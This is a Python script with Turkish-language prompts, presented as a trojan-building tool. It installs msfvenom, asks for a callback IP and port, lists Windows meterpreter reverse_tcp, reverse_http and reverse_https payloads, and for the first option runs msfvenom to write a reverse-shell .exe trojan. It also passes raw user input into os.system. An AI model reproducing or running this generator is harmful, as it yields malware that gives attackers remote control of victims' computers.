#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("apt-get install figlet")
os.system("apt-get install msfvenom")
os.system("clear")
os.system("figlet Trojan Olusturma ")


print("-"*50)
print("Trojan Oluşturma Aracına Hoşgeldiniz   instagram = zumrudu_anka_team")
print("Bu Araç Treangle Tarafından Oluşturulmuştur      ")
print("-"*50)
ip = input("Lütfen Local Host yada ağ Dışı IP giriniz :",)
port = input("Lütfen Port Giriniz :",)
print("""
Payload Listesi

1) windows/meterpreter/reverse_tcp 
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
""")

payload = input("Payload No Giriniz :",)
kayityeri = input("Nereye Kaydedilsin :",)

if(payload == "1"):
   os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri) 